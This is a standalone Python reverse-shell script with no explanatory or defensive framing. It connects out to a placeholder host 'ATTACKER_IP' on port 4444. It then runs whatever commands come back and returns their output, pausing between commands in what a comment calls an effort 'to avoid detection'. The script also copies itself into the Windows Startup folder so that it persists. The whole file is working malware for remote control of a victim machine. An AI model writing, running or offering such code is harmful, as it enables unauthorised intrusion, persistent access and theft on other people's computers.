import socket
import subprocess
import os
import time
import shutil

def reverse_shell():
    # Define the target IP and port
    target_ip = 'ATTACKER_IP'
    target_port = 4444

    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the target machine
        s.connect((target_ip, target_port))

        # Send a message to the attacker
        s.send(b"Connected to the target machine\n")

        while True:
            # Receive commands from the attacker
            command = s.recv(1024).decode()

            if command.lower() == 'exit':
                break

            # Execute the command and send the output back to the attacker
            if command[:2] == 'cd':
                os.chdir(command[3:])
                s.send(str.encode(os.getcwd() + '> '))
            else:
                try:
                    output = subprocess.getoutput(command)
                    s.send(str.encode(output + '\n'))
                except Exception as e:
                    s.send(str.encode(str(e) + '\n'))

            # Sleep for a short period to avoid detection
            time.sleep(1)

        # Close the connection
        s.close()
    except Exception as e:
        print(f"Error: {e}")

def add_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    shutil.copyfile(__file__, os.path.join(startup_path, 'reverse_shell.py'))

if __name__ == "__main__":
    add_to_startup()
    reverse_shell()